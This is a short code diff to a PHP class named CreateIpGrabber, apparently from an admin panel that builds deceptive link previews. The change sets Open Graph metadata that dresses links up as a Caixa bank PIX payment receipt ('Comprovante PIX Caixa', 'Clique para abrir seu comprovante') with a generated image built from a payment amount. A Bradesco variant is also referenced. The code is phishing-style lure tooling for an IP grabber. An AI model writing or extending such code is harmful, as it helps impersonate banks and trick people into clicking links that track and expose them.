@@ -119,8 +119,10 @@ class CreateIpGrabber extends CreateRecord
             $valor = trim((string) ($data['pix_caixa_valor'] ?? ''));
             unset($data['pix_caixa_valor']);
 
-            $data['og_titulo']   = 'Comprovante PIX Caixa';
-            $data['og_descricao'] = 'Confirme sua chave pix clicando aqui.';
+            $this->ogGerado = [
+                'og_titulo'   => 'Comprovante PIX Caixa',
+                'og_descricao' => 'Clique para abrir seu comprovante.',
+            ];
 
             if ($valor !== '') {
                 try {
@@ -131,10 +133,12 @@ class CreateIpGrabber extends CreateRecord
                 }
 
                 if ($pathGerado) {
-                    $this->ogGerado = ['og_imagem_upload' => $pathGerado, 'og_imagem' => null];
-                    $data = array_merge($data, $this->ogGerado);
+                    $this->ogGerado['og_imagem_upload'] = $pathGerado;
+                    $this->ogGerado['og_imagem']        = null;
                 }
             }
+
+            $data = array_merge($data, $this->ogGerado);
         }
 
         if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
